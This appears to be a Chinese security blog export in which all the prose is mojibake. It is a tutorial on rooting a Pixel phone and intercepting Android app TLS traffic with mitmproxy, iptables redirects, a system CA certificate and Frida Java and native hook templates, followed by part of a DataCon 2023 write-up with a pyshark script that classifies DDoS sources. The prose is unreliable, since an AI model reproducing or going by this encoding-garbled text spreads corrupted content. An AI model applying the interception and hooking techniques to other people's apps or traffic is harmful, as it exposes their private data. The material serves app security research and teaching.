mitmproxyï¼šä¸­é—´äººå·¥å…·ï¼Œç”¨æ¥ç›‘æ§å¹¶è§£å¯†appç«¯TLSæµé‡ wiresharkï¼šå¯¹ç½‘å¡è¿›è¡ŒæŠ“åŒ…ï¼Œé…åˆmitmproxyä½¿ç”¨å¯ä»¥è·å–tlsè§£å¯†åçš„æµé‡ä¿¡æ¯ idaï¼šç”¨æ¥åç¼–è¯‘Android nativeå±‚ä»£ç  iptablesï¼šé…åˆmitmproxyé€æ˜æ¨¡å¼ï¼Œé¿å…appç«¯æµé‡ä¸ç»è¿‡ä»£ç†å¯¼è‡´tlsæµé‡æ— æ³•è¢«è§£å¯† æ‰‹æœºï¼šå·²ROOT adbï¼šç”¨æ¥è¿æ¥æ‰‹æœºçš„shell ç¯å¢ƒæ­å»ºè·å–æ‰‹æœºRootæƒé™æœ¬æ¬¡ä½¿ç”¨çš„æ‰‹æœºæ˜¯ä¸€å°Pixel 6ï¼Œé¦–å…ˆéœ€è¦åœ¨ç”µè„‘ä¸Šå®‰è£…adbï¼Œè¿‡ç¨‹çœç•¥ è¿›å…¥æ‰‹æœºå¼€å‘è€…æ¨¡å¼ï¼Œæ‰“å¼€USBè°ƒè¯•å¼€å…³ï¼Œè¿æ¥ç”µè„‘adbï¼Œå¯ä»¥ä½¿ç”¨adb devicesæŸ¥çœ‹æ˜¯å¦è¿æ¥æˆåŠŸï¼Œè¿æ¥æˆåŠŸåå¼€å§‹è§£BLï¼Œè¾“å…¥ 1adb reboot bootloader å°†æ‰‹æœºè¿›å…¥Bootloaderç•Œé¢ï¼Œæ­¤æ—¶æ‰‹æœºå¤„äºfastbootæ¨¡å¼ä¸‹ï¼Œè¾“å…¥fastboot devicesæŸ¥çœ‹æ˜¯å¦å¯ä»¥æ­£å¸¸è¿æ¥ã€‚è¾“å…¥ 1fastboot flashing unlock æˆåŠŸè§£é”BLã€‚ æ³¨ï¼šPixelæ‰‹æœºå¦‚æœå‘ç°è¿›å…¥fastbootæ¨¡å¼adbæ–­å¼€çš„æƒ…å†µï¼Œè¯·æ£€æŸ¥æ˜¯å¦æ˜¯æ•°æ®çº¿çš„åŸå› ï¼Œå¯ä»¥æ¢ä¸ªæ•°æ®çº¿è¯•è¯•ï¼Œè¿™ä¸ªå‘å¡äº†æˆ‘å¥½ä¹…-_- è§£é”BLåï¼Œä¸€èˆ¬éƒ½ä¼šå‘æ‰‹æœºä¸­å®‰è£…Magiskï¼Œå®ƒæ˜¯ç”¨æ¥ç®¡ç†Rootæƒé™çš„å·¥å…·ã€‚æ¥æºï¼štopjohnwu&#x2F;Magisk: The Magic Mask for Android (github.com) ä¸‹è½½å¥½å®‰è£…åŒ…åï¼Œå¯ä»¥ä½¿ç”¨adb installå‘½ä»¤æ¥å®‰è£…Magiskï¼Œè£…å¥½Magiskåï¼Œæ¥ä¸‹æ¥è¿›è¡Œé•œåƒä¿®è¡¥ã€‚ åœ¨Nexus å’Œ Pixel è®¾å¤‡çš„å‡ºå‚æ˜ åƒ | Google Play services | Google for Developersä¸­ä¸‹è½½æ‰‹æœºå¯¹åº”çš„é•œåƒæ–‡ä»¶ï¼Œåœ¨æ‰‹æœºè®¾ç½® - å…³äºæ‰‹æœºé¡µé¢çš„æœ€åº•ç«¯å¯ä»¥çœ‹åˆ°å½“å‰çš„ç‰ˆæœ¬å·ï¼Œåœ¨é¡µé¢ä¸­æ‰¾åˆ°å¯¹åº”çš„é•œåƒä¸‹è½½ï¼Œä¸‹è½½åå°†å…¶ä¸­çš„boot.imgç”¨adbä¼ è¾“åˆ°æ‰‹æœºï¼Œæœ€åä½¿ç”¨Magiskè½¯ä»¶è¿›è¡Œé•œåƒä¿®è¡¥ï¼Œæœ€åå°†ä¿®è¡¥å®Œçš„é•œåƒæ–‡ä»¶adb pullå‡ºæ¥ã€‚ æ¥ä¸‹æ¥è¿›å…¥æœ€åçš„åˆ·æœºæ­¥éª¤ï¼Œä½¿ç”¨adb reboot bootloaderå†æ¬¡è¿›å…¥fastbootæ¨¡å¼ä¸­ï¼Œä½¿ç”¨fastboot boot imgåœ°å€æŒ‡ä»¤å°†æ‰‹æœºä»ä¿®è¡¥è¿‡çš„imgå¯åŠ¨ï¼Œé‡å¯åè¿›å…¥MagiskæŒ‰ç…§æ­¥éª¤å®‰è£…å¥½å³å¯ã€‚ mitmproxy+iptablesæ­å»ºä¸­é—´äººä»£ç†mitmproxyæ˜¯ä¸€ä¸ªå¼ºå¤§çš„ä¸­é—´äººä»£ç†å·¥å…·ï¼Œä¸å…¶ä»–ä¸­é—´äººä»£ç†å·¥å…·ç›¸æ¯”ï¼Œmitmproxyä¸ä»…å¯ä»¥è½¬å‘http&#x2F;httpsæµé‡ï¼Œè¿˜å¯ä»¥è½¬å‘éhttpæµé‡ï¼Œå¦‚MQTTç­‰ã€‚ åœ¨Androidè®¾å¤‡ä¸­æŠ“å–httpsæµé‡ï¼Œæˆ‘ä»¬éœ€è¦å®‰è£…mitmproxyçš„CAè¯ä¹¦ï¼Œç”±äºAndroid 7å¼€å§‹ï¼Œåº”ç”¨ä¼šé»˜è®¤å¿½ç•¥ç”¨æˆ·çº§åˆ«çš„è¯ä¹¦ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦å°†CAè¯ä¹¦æ”¾å…¥ç³»ç»Ÿçº§åˆ«ä¸­ã€‚ ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå°†è¯ä¹¦æ ¼å¼å…ˆè½¬åŒ–ä¸ºpemæ ¼å¼ï¼Œç„¶åé€šè¿‡openssl x509 -subject_hash_old -in certificate.pem|head -1å‘½ä»¤è¯»å–å“ˆå¸Œå€¼ï¼Œå°†pemè¯ä¹¦åå­—æ”¹ä¸ºåˆšåˆšæå–çš„å“ˆå¸Œå€¼åŠ .0ï¼Œå¦‚9a5ba575.0ï¼Œå…¶ä¸­.0æ˜¯ä¸ºäº†é˜²æ­¢è¯ä¹¦å“ˆå¸Œå€¼é‡å¤ï¼Œå¦‚æœä¸¤ä¸ªè¯ä¹¦å“ˆå¸Œå€¼é‡å¤ï¼Œé‚£ä¹ˆåé¢çš„è¯ä¹¦å°±ä¼šè¢«é‡å‘½åä¸º.1ã€.2ç­‰ï¼Œæœ€åå°†/system/etc/security/cacerts/ç›®å½•å¯å†™æƒé™æ‰“å¼€ï¼Œå°†é‡å‘½ååçš„è¯ä¹¦æ”¾è¿›å»å³å¯ã€‚ æˆ‘çš„æ‰‹æœºç‰ˆæœ¬ä¸ºAndroid 10ä»¥ä¸Šï¼Œæ— æ³•ç›´æ¥é€šè¿‡æ›´æ”¹æ–‡ä»¶å¤¹å†™å…¥æƒé™æ¥å¯¼å…¥è¯ä¹¦ï¼ˆä¹Ÿå¯èƒ½æ˜¯æˆ‘æ²¡æœ‰æå¥½ï¼‰ï¼Œæˆ‘ä½¿ç”¨äº†Magiskçš„Always Trust User Certificatesæ¨¡å—ï¼Œç›´æ¥å°†è¯ä¹¦è£…åœ¨ç”¨æˆ·ç›®å½•ä¸‹ï¼Œé‡å¯åå³å¯å¯¼å…¥åˆ°ç³»ç»Ÿè¯ä¹¦ä¸­ã€‚ è£…å¥½è¯ä¹¦åï¼Œæ­£å¸¸æƒ…å†µä¸‹æ‰‹æœºç«¯è¿wifiæ—¶é…ç½®ä»£ç†ååº”è¯¥æ˜¯å¯ä»¥è§£å¯†httpsæµé‡äº†ï¼Œä½†æ˜¯ï¼Œå¦‚æœappæ‹’ç»ä»£ç†æˆ–æƒ³è¦æ•è·å…¶ä»–tcpæµé‡æ—¶ï¼Œå°±éœ€è¦ä½¿ç”¨mitmproxyé€æ˜æ¨¡å¼ï¼Œé€æ˜æ¨¡å¼çš„å¯åŠ¨å‘½ä»¤ä¸ºmitmproxy --mode transparent --showhostï¼Œå¼€å¯é€æ˜æ¨¡å¼åï¼Œå·¥ä½œåŸç†å¦‚ä¸‹å›¾ï¼š æ­¤æ—¶ï¼Œå¯¹äºæ‰‹æœºæ¥è¯´ï¼Œmitmproxyç›¸å½“äºä¸€ä¸ªæœåŠ¡å™¨ï¼Œå¯¹äºåŸæœåŠ¡å™¨æ¥è¯´ï¼Œmitmproxyç›¸å½“äºè®¾å¤‡ã€‚ ç”±äºé€æ˜æ¨¡å¼éœ€è¦å¯¹ç½‘ç»œå±‚è¿›è¡Œè½¬å‘ï¼Œå› æ­¤è¿˜éœ€è¦é…ç½®iptablesï¼Œå…³äºiptablesçš„çŸ¥è¯†å¯ä»¥çœ‹è¿™ç¯‡åšå®¢iptables-æœ±åŒå°åšå®¢ (zsythink.net)ï¼Œåœ¨æ­¤è´´ä¸€å¼ iptablesçš„åŸç†å›¾ã€‚ æˆ‘çš„iptablesè§„åˆ™å‚è€ƒäº†fwxå­¦é•¿çš„åšå®¢åŸºäºmitmproxy+iptables+SSL pinningç»•è¿‡æŠ€æœ¯+wiresharkçš„å®‰å“APPæµé‡ï¼ˆåŒ…æ‹¬HTTPã€HTTPSå’ŒéHTTPï¼‰æ•è· | ä»£ç é¬¼æ‰çš„Blog (fwx2233.github.io)ï¼Œå¦‚ä¸‹ï¼š 123456789101112131415#!/bin/bash# å†™ç›‘å¬çš„æ— çº¿ç½‘å¡çš„åç§°WIRELESS_CARD=&quot;wlxc01c30151c62&quot;# å¼€å¯ç›¸å…³çš„è½¬å‘æœåŠ¡sudo sysctl -w net.ipv4.ip_forward=1sudo sysctl -w net.ipv4.conf.all.send_redirects=0# è®¾ç½®iptablesçš„è§„åˆ™# å°†ä¹‹å‰çš„è§„åˆ™æ¸…ç©ºsudo iptables -F PREROUTING -t nat -i $WIRELESS_CARD# è®¾ç½®ç«¯å£è½¬å‘(MQTT: 8883, HTTP: 80, HTTS: 443)sudo iptables -t nat -A PREROUTING -i $WIRELESS_CARD -p tcp --dport 80 -j REDIRECT --to-port 8080sudo iptables -t nat -A PREROUTING -i $WIRELESS_CARD -p tcp --dport 443 -j REDIRECT --to-port 8080sudo iptables -t nat -A PREROUTING -i $WIRELESS_CARD -p tcp --dport 8883 -j REDIRECT --to-port 8080 æœ€å¼€å§‹æˆ‘ä¸€ç›´æƒ³è¦æ‹¿win+mitmproxyé€æ˜æ¨¡å¼è¿›è¡ŒæŠ“åŒ…ï¼Œæƒ³è¦é€šè¿‡netshæ¥ä»£æ›¿iptablesè¿›è¡Œæµé‡è½¬å‘ï¼Œç„¶è€Œä¸€ç›´æ²¡æœ‰æˆåŠŸï¼Œå¦‚æœè¯»è€…æœ‰é…ç½®æˆåŠŸçš„ç»å†éº»çƒ¦è¯„è®ºåŒºåˆ†äº«ä¸€ä¸‹ æ¥ä¸‹æ¥é…ç½®wiresharkï¼Œé€šè¿‡æ•è·mitmproxyå¯†é’¥äº¤æ¢è¿‡ç¨‹ä¸­ç”Ÿæˆçš„éšæœºæ•°æ¥è¿›è¡ŒTLSè§£å¯†ï¼Œæ“ä½œæ–¹å¼ä¹Ÿå¯ä»¥ç›´æ¥çœ‹å®˜æ–¹æ–‡æ¡£Wireshark and SSL&#x2F;TLS (mitmproxy.org) å¦‚æœæ—¶é—´è¿‡é•¿æˆ–å¤šæ¬¡æŠ“åŒ…å¯¼è‡´ç”Ÿæˆçš„éšæœºæ•°æ–‡ä»¶è¿‡å¤§ï¼Œå¯èƒ½ä¼šå¯¼è‡´wiresharkè§£å¯†å¤±è´¥ï¼Œå¯ä»¥å®šæ—¶æ¸…ç©ºç”Ÿæˆçš„éšæœºæ•°æ–‡ä»¶ã€‚ è‡³æ­¤åŸºæœ¬ç¯å¢ƒé…ç½®å®Œæ¯•ï¼Œç»™å‡ºæˆ‘çš„æœ€ç»ˆç½‘ç»œæ‹“æ‰‘å›¾ã€‚ åŸç†fridaè¿›è¡Œhookfridaå®‰è£…è¿‡ç¨‹çœç•¥ï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šæ•™ç¨‹å¯ä»¥å‚è€ƒã€‚ fridaä¸­æœ‰ä¸¤ç§æ“ä½œæ¨¡å¼ï¼Œåˆ†åˆ«æ˜¯CLIæ¨¡å¼å’ŒRPCæ¨¡å¼ CLIï¼ˆå‘½ä»¤è¡Œï¼‰æ¨¡å¼ï¼šé€šè¿‡å‘½ä»¤è¡Œç›´æ¥å°†JavaScriptè„šæœ¬æ³¨å…¥è¿›ç¨‹ä¸­ï¼Œå¯¹è¿›ç¨‹è¿›è¡Œæ“ä½œ RPCæ¨¡å¼ï¼šä½¿ç”¨Pythonè¿›è¡ŒJavaScriptè„šæœ¬çš„æ³¨å…¥å·¥ä½œï¼Œå®é™…å¯¹è¿›ç¨‹è¿›è¡Œæ“ä½œçš„è¿˜æ˜¯JavaScriptè„šæœ¬ï¼Œå¯ä»¥é€šè¿‡RPCä¼ è¾“ç»™Pythonè„šæœ¬æ¥è¿›è¡Œå¤æ‚æ•°æ®çš„å¤„ç† fridaæœ‰ä¸¤ç§æ³¨å…¥æ¨¡å¼ï¼Œåˆ†åˆ«æ˜¯Spawnå’ŒAttach Spawnæ¨¡å¼ï¼šå°†å¯åŠ¨Appçš„æƒåˆ©äº¤ç”±Fridaæ¥æ§åˆ¶ï¼Œå³ä½¿ç›®æ ‡Appå·²ç»å¯åŠ¨ï¼Œåœ¨ä½¿ç”¨Fridaæ³¨å…¥ç¨‹åºæ—¶è¿˜æ˜¯ä¼šé‡æ–°å¯åŠ¨Appã€‚åœ¨å‘½ä»¤è¡Œæ¨¡å¼ä¸­éœ€è¦åŠ å…¥å‚æ•°-fï¼Œå¯ä»¥å¯¹ä»å¯åŠ¨å°±å¼€å§‹å¯¹Appè¿›è¡Œç›‘æ§ã€‚ Attachæ¨¡å¼ï¼šåœ¨ç›®æ ‡Appå·²ç»å¯åŠ¨çš„æƒ…å†µä¸‹ï¼ŒFridaé€šè¿‡ptraceæ³¨å…¥ç¨‹åºä»è€Œæ‰§è¡ŒHookçš„æ“ä½œã€‚å¦‚æœåªå…³å¿ƒä¸€ä¸ªåŠŸèƒ½æ—¶é€šå¸¸ä¼šç”¨è¿™ç§æ¨¡å¼ã€‚ ç›¸å…³çš„apiå¯ä»¥åœ¨å®˜ç½‘ä¸ŠæŸ¥çœ‹å®˜æ–¹æ–‡æ¡£Welcome | Frida â€¢ A world-class dynamic instrumentation toolkit ç»™å‡ºä¸€ä¸ªpythonçš„æ¡†æ¶ä»£ç ï¼š 123456789101112131415161718import sys,fridajscode = &quot;&quot;&quot;è¿™é‡Œè¾“å…¥ä½ çš„jsä»£ç &quot;&quot;&quot;def on_message(message,data): if message[&quot;type&quot;] == &quot;send&quot;: print(message[&quot;payload&quot;]) else: print(message)# process = frida.get_usb_device().spawn(&quot;app&quot;))process = frida.get_usb_device().attach(&quot;app&quot;)script = process.create_script(jscode)script.on(&quot;message&quot;,on_message)script.load()sys.stdin.read() Javaå±‚hookJavaå±‚hookç¤ºä¾‹ä»£ç ï¼š 1234567891011setImmediate( Java.perform(function () &#123; var targetClass = Java.use(className); // æ›¿æ¢ä¸ºæ‚¨çš„ç±»å targetClass.examplefunction.implementation = function(a,b,c...)&#123;//æ›¿æ¢ä¸ºå‚æ•° //è°ƒç”¨åŸå§‹æ–¹æ³• var result = this.examplefunction(a, b, c...); //å¯ä»¥åœ¨è¿™é‡Œè¿›è¡Œå„ç§æ“ä½œ return result; &#125; &#125;);); hooké‡è½½å‚æ•°ï¼š 123456789function hook()&#123; var utils = Java.use(className); //overloadå®šä¹‰é‡è½½å‡½æ•°ï¼Œæ ¹æ®å‡½æ•°çš„å‚æ•°ç±»å‹å¡« utils.expfunc.overload(&#x27;com.example.Demo$Class&#x27;,&#x27;java.lang.String&#x27;).implementation = function(aï¼Œb)&#123; b = &quot;aaaaaaaaaa&quot;; this.expfunc(a,b); console.log(b); &#125;&#125; hookå­—æ®µä¿®æ”¹ï¼š 123456789101112131415161718function hook()&#123; //é™æ€å­—æ®µä¿®æ”¹ var utils = Java.use(className); //ä¿®æ”¹ç±»çš„é™æ€å­—æ®µ&quot;flag&quot;çš„å€¼ utils.staticField.value = &quot;æˆ‘æ˜¯è¢«ä¿®æ”¹çš„é™æ€å˜é‡&quot;; console.log(utils.staticField.value); //éé™æ€å­—æ®µçš„ä¿®æ”¹ //ä½¿ç”¨`Java.choose()`æšä¸¾ç±»çš„æ‰€æœ‰å®ä¾‹ Java.choose(&quot;com.example.Demo&quot;, &#123; onMatch: function(obj)&#123; //ä¿®æ”¹å®ä¾‹çš„éé™æ€å­—æ®µ&quot;_privateInt&quot;çš„å€¼ä¸º&quot;123456&quot;ï¼Œå¹¶ä¿®æ”¹éé™æ€å­—æ®µ&quot;privateInt&quot;çš„å€¼ä¸º9999ã€‚ obj._privateInt.value = &quot;123456&quot;; //å­—æ®µåä¸å‡½æ•°åç›¸åŒ å‰é¢åŠ ä¸ªä¸‹åˆ’çº¿ obj.privateInt.value = 9999; &#125;, onComplete: function()&#123; &#125; &#125;);&#125; å¯¹å†…éƒ¨ç±»è¿›è¡Œhook 12345678function hook()&#123; //å†…éƒ¨ç±» var innerClass = Java.use(&quot;com.example.Demo$innerClass&quot;);//å¦‚æœæ˜¯åŒ¿åç±»éœ€è¦åç¼–è¯‘æŸ¥çœ‹å…·ä½“æ ‡å· console.log(innerClass); innerClass.$init.implementation = function()&#123; console.log(&quot;hook&quot;); &#125;&#125; é™æ€æ–¹æ³•ä¸»åŠ¨è°ƒç”¨ 1234function hook()&#123; var ClassName=Java.use(&quot;com.example.Demo&quot;); ClassName.privateFunc(&quot;ä¼ å‚&quot;);&#125; éé™æ€æ–¹æ³•ä¸»åŠ¨è°ƒç”¨ 1234567891011var ret;function hook() &#123; Java.choose(&quot;com.example.Demo&quot;,&#123; //è¦hookçš„ç±» onMatch:function(instance)&#123; ret=instance.privateFunc(&quot;aaaaaaa&quot;); //è¦hookçš„æ–¹æ³• &#125;, onComplete:function()&#123; console.log(&quot;result: &quot; + ret); &#125; &#125;);&#125; Nativeå±‚hookæšä¸¾soåº“ 123456789101112131415function hook()&#123; Process.enumerateModules(&#123; onMatch: function (module) &#123; send(module.name + &quot; : &quot; + module.base.toString()); if (module.name == &quot;example.so&quot;) &#123; send(&quot;example.so found !&quot;); send(&quot;hooking...&quot;); send(module.name + &quot; : &quot; + module.base.toString() + &quot; : &quot; + module.size.toString() + &quot; : &quot; + module.path); &#125; &#125;, onComplete: function () &#123; send(&quot;end&quot;); &#125; &#125;);&#125; hookå‡½æ•° 123456789101112function hook()&#123; var base_addr = Module.findBaseAddress(&quot;example.so&quot;); Interceptor.attach(base_addr.add(0xabcd), &#123;//åç§»å€¼ onEnter: function (args) &#123; //argsæ˜¯å‚æ•°æ•°ç»„ console.log(args[0]); &#125;, onLeave: function (retval) &#123; console.log(retval); &#125; &#125;);&#125; è¿™é‡Œæœ‰ä¸€ä¸ªåç§»å€¼çš„è®¡ç®—ï¼Œå®‰å“é‡Œä¸€èˆ¬32 ä½çš„ so ä¸­éƒ½æ˜¯thumbæŒ‡ä»¤ï¼Œ64 ä½çš„ so ä¸­éƒ½æ˜¯armæŒ‡ä»¤ï¼Œé€šè¿‡IDAé‡Œçš„opcode bytesæ¥åˆ¤æ–­ï¼Œarm æŒ‡ä»¤ä¸º 4 ä¸ªå­—èŠ‚(options -&gt; general -&gt; Number of opcode bytes (non-graph) è¾“å…¥4) thumb æŒ‡ä»¤ï¼Œå‡½æ•°åœ°å€è®¡ç®—æ–¹å¼ï¼š so åŸºå€ + å‡½æ•°åœ¨ so ä¸­çš„åç§» + 1 arm æŒ‡ä»¤ï¼Œå‡½æ•°åœ°å€è®¡ç®—æ–¹å¼ï¼š so åŸºå€ + å‡½æ•°åœ¨ so ä¸­çš„åç§» IDAå¯¹soåº“é€†å‘idaçš„è¯å°±æ˜¯çº¯çœ‹ä»£ç ç¯èŠ‚äº†ï¼Œè¯´å‡ ä¸ªå°æŠ€å·§å§ã€‚ é¦–å…ˆå°±æ˜¯å°½é‡ä¸è¦ä»å¯¼å‡ºè¡¨ä¸­åè¿‡æ¥æ‰¾å‡½æ•°ï¼Œå› ä¸ºæœ‰ä¸€éƒ¨åˆ†å¯¼å‡ºè¡¨å¯¹åº”çš„å‡½æ•°æ˜¯fastcallç±»å‹ï¼Œåªè§‚å¯Ÿå‡½æ•°å†…éƒ¨æœ‰æ—¶idaæ— æ³•å°†å‚æ•°è¯†åˆ«å‡ºæ¥ï¼Œå¯¼è‡´åæ¥å†å»æ‰¾å‡½æ•°çš„è°ƒç”¨å¤„æ—¶ä»£ç éƒ½æ˜¯ä¹±çš„ã€‚ idaæœ‰ä¸€é”®ç”Ÿæˆfridaçš„æ’ä»¶ï¼ŒP4nda0s&#x2F;IDAFrida: IDA Frida Plugin for tracing something interesting. (github.com)å’ŒAnxiangLemon&#x2F;MyIdaFrida: Generate Frida Script (github.com)ï¼Œå¯ä»¥ç›´æ¥ä»idaä¸­ç”Ÿæˆfridaçš„hookè„šæœ¬ï¼Œæ¯”è¾ƒæ–¹ä¾¿ï¼ˆè™½ç„¶æˆ‘æ²¡ç”¨è¿‡å‡ æ¬¡ï¼‰ åè®°å…³äºæ¼æ´ç»†èŠ‚å°±ä¸å‘å‡ºæ¥äº†ã€‚å†æ—¶2ä¸ªå¤šæœˆçš„é›¶åŸºç¡€ä»å…¥é—¨åˆ°å…¥åœŸï¼Œç¡®å®å­¦åˆ°äº†ä¸å°‘ä¸œè¥¿ï¼Œä¹Ÿè¸©äº†ä¸€å¤§å †å‘ï¼Œæœ‰çš„å‘ä¹Ÿå¡çš„æ¯”è¾ƒä¹…ï¼Œåœ¨æ­¤æ„Ÿè°¢wå­¦é•¿ç»™æˆ‘ä¸€æ­¥æ­¥æ¢³ç†æ€è·¯ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://blog.lazyforever.top/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"wireshark","slug":"wireshark","permalink":"https://blog.lazyforever.top/tags/wireshark/"},{"name":"apké€†å‘","slug":"apké€†å‘","permalink":"https://blog.lazyforever.top/tags/apk%E9%80%86%E5%90%91/"},{"name":"frida","slug":"frida","permalink":"https://blog.lazyforever.top/tags/frida/"},{"name":"mitmproxy","slug":"mitmproxy","permalink":"https://blog.lazyforever.top/tags/mitmproxy/"},{"name":"jeb","slug":"jeb","permalink":"https://blog.lazyforever.top/tags/jeb/"},{"name":"jadx","slug":"jadx","permalink":"https://blog.lazyforever.top/tags/jadx/"}]},{"title":"2023 DataConå¤§æ•°æ®å®‰å…¨åˆ†æç«èµ› WriteUp","slug":"2023datacon","date":"2023-11-16T13:04:22.000Z","updated":"2023-12-22T10:15:30.773Z","comments":true,"path":"2023/11/16/2023datacon/","link":"","permalink":"https://blog.lazyforever.top/2023/11/16/2023datacon/","excerpt":"","text":"äº’è”ç½‘å¨èƒæº¯æºé¢˜ç›®ä¸€ï¼šå½¢å½¢è‰²è‰²çš„DDoSåˆ†ææ ¹æ®é¢˜ç›®æè¿°ï¼Œæ”»å‡»è€…é‡‡ç”¨äº†å¤šç§DDoSæ”»å‡»æ–¹æ³•ï¼Œæ‰¾å‡ºè¿™äº›æ”»å‡»æµé‡ï¼Œå¹¶å°†æ”»å‡»ç±»å‹ç›¸åŒçš„æºIPè¿›è¡Œå½’ç±»ã€‚ åˆ†æé¢˜ç›®æä¾›çš„æµé‡åŒ…ï¼Œwiresharkæ‰“å¼€ã€‚ è§‚å¯Ÿåˆ°å¤šç§ddosæµé‡ã€‚ SYN Flood Attackæµé‡ç‰¹å¾ï¼šä»…æœ‰ä¸€ä¸ªtcpåŒ…ã€‚ UDP Flood Attackæµé‡ç‰¹å¾ï¼šåè®®ä¸ºUDPï¼Œå†…å®¹æ‚ä¹±ã€‚ NTP Reply Flood Attackæµé‡ç‰¹å¾ï¼šåè®®ä¸ºNTP CC Attackæµé‡ç‰¹å¾ï¼šå…·æœ‰å®Œæ•´çš„TCPæµé‡åŒ…ã€‚ æ­¤æ¬¡ddosä¸­CCæ”»å‡»æœ‰ä¸¤ç§å½¢å¼ï¼š ç¬¬ä¸€ç§ï¼ˆç¤ºä¾‹ï¼‰123456GET / HTTP/1.1Connection: keep-aliveX-a: datacon2023-1278X-a: datacon2023-591X-a: datacon2023-452X-a: datacon2023-815 ç¬¬äºŒç§ï¼ˆç¤ºä¾‹ï¼‰12345678GET / HTTP/1.1Connection: keep-aliveContent-Length: 1000X-a: datacon2023-256X-a: datacon2023-968X-a: datacon2023-236X-a: datacon2023-808 æ›´æ–°äº2023&#x2F;12&#x2F;10 wpç»ˆäºå‡ºäº†ï¼ŒåŸæ¥è¿™ä¸¤ä¸ªåˆ†åˆ«æ˜¯æ…¢é€Ÿhttp headeræ³›æ´ªæ”»å‡»å’Œæ…¢é€Ÿhttp payloadæ³›æ´ªæ”»å‡»ï¼ŒåŒºåˆ«æ˜¯ï¼šç¬¬ä¸€ç§ä¼šå®šæœŸå‘ç›®æ ‡å‘é€éƒ¨åˆ†è¯·æ±‚æ ‡å¤´ï¼Œä»¥ä½¿è¯·æ±‚ä¿æŒæ´»åŠ¨çŠ¶æ€ï¼›ç¬¬äºŒç§ä¼šå‘é€ä¸€ä¸ªå€¼å¾ˆå¤§çš„Content-Lengthå­—æ®µï¼Œä¹‹åæ…¢æ…¢å‘é€å°‘é‡å­—èŠ‚çš„æ•°æ®åŒ…ï¼Œä¸»æœºå°±ä¼šè®¤ä¸ºè¯¥è¯·æ±‚åŒ…å­˜åœ¨payloadæ²¡æœ‰å‘å®Œï¼Œå› æ­¤ä¼šç»´æŒè¿æ¥ã€‚ è§£ç­”è®¾ç½®è¿‡æ»¤å™¨ï¼Œç¼–å†™è„šæœ¬ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586import pysharktshark=r&quot;C:\\sec\\Wireshark\\tshark.exe&quot; # æœ¬åœ°tsharkè·¯å¾„pcap=&#x27;../pcap.pcapng&#x27; # æœ¬åœ°pcapä½ç½®# è¯»å–pcapæ–‡ä»¶å¹¶åˆ†ç±»udp_cap = pyshark.FileCapture(pcap, display_filter=&#x27;udp&#x27;,tshark_path=tshark)ntp_cap = pyshark.FileCapture(pcap, display_filter=&#x27;ntp&#x27;,tshark_path=tshark)tls_cap = pyshark.FileCapture(pcap, display_filter=&#x27;tls&#x27;,tshark_path=tshark)cc2_cap= pyshark.FileCapture(pcap, display_filter=&#x27;tcp.flags.syn==1 &amp;&amp; tcp.options&#x27;, tshark_path=tshark)syn_cap= pyshark.FileCapture(pcap, display_filter=&#x27;tcp.flags.syn==1&#x27;, tshark_path=tshark)# è§‚å¯Ÿåˆ°æœ€åæ—¶é—´æ®µé™¤äº†ä¸€ä¸ªipä»¥å¤–éƒ½æ˜¯cc1æœ«æµé‡åŒ…cc1_cap=pyshark.FileCapture(pcap, display_filter=&#x27;frame.time_relative&gt;=100.053&#x27;, tshark_path=tshark)get_except=(&quot;92.126.115.64&quot;)target=(&#x27;93.224.28.177&#x27;) # è¢«ddosæœºip# ç”¨äºå­˜å‚¨IPåœ°å€çš„é›†åˆudp_list = set()ntp_list = set()tls_list=set()cc2_list=set()syn_list=set()cc1_list=set()for packet in cc1_cap: try: source_ip = packet.ip.src if source_ip not in target and source_ip not in get_except: cc1_list.add(source_ip) except AttributeError: passfor packet in cc2_cap: try: source_ip = packet.ip.src if source_ip not in target and source_ip not in cc1_list: cc2_list.add(source_ip) except AttributeError: passfor packet in syn_cap: try: source_ip = packet.ip.src if source_ip not in target and source_ip not in cc2_list and source_ip not in cc1_list: syn_list.add(source_ip) except AttributeError: passfor packet in tls_cap: try: source_ip = packet.ip.src if source_ip not in target: tls_list.add(source_ip) except AttributeError: passfor packet in ntp_cap: try: source_ip = packet.ip.src if source_ip not in target: ntp_list.add(source_ip) except AttributeError: passfor packet in udp_cap: try: source_ip = packet.ip.src if source_ip not in ntp_list and source_ip not in target: udp_list.add(source_ip) except AttributeError: pass# å°†IPåœ°å€å¯¼å‡ºåˆ°txtæ–‡ä»¶with open(&#x27;q1_answer.txt&#x27;, &#x27;w&#x27;) as f: f.write(&#x27;,&#x27;.join(udp_list)) f.write(&#x27;\\n&#x27;) f.write(&#x27;,&#x27;.join(ntp_list)) f.write(&#x27;\\n&#x27;) f.write(&#x27;,&#x27;.join(cc2_list)) f.write(&#x27;\\n&#x27;) f.write(&#x27;,&#x27;.join(syn_list)) f.write(&#x27;\\n&#x27;) f.write(&#x27;,&#x27;.join(cc1_list)) é¢˜ç›®äºŒï¼šå¨èƒæƒ…æŠ¥çš„å…³è”åˆ†æåˆ†æé¢˜ç›®æè¿°ï¼šé€‰æ‰‹ç‚¹å‡»ä¸‹è½½è¯¥é¢˜æä¾›çš„æ–‡ä»¶ï¼Œæœ¬æ–‡ä»¶æ˜¯éƒ¨åˆ†å…¬ç½‘èœœç½æ—¥å¿—ã€‚å·²çŸ¥æœ¬æ¬¡çš„DDoSæ”»å‡»ç”±åƒµå°¸ç½‘ç»œå›¢ä¼™å‘èµ·ï¼Œè¯¥å›¢ä¼™ä¼ æ’­äº†ä¸¤ç§æ¶æ„æ ·æœ¬æ–‡ä»¶ã€‚åœ¨æœ¬æ¬¡æ”»å‡»ä¸­ï¼Œè¯¥å›¢ä¼™åˆ©ç”¨CVE-2019-7238æ¼æ´ç»„å»ºåƒµå°¸ç½‘ç»œã€‚è¯·æ‰¾åˆ°è¿™ä¸¤ç§æ¶æ„æ ·æœ¬æ–‡ä»¶ï¼Œå¹¶ç»™å‡ºæ¯ç§æ¶æ„æ ·æœ¬æ–‡ä»¶çš„MD5ä»¥åŠæ¯ç§æ¶æ„æ ·æœ¬æ–‡ä»¶åœ¨èœœç½æ—¥å¿—çš„ä¼ 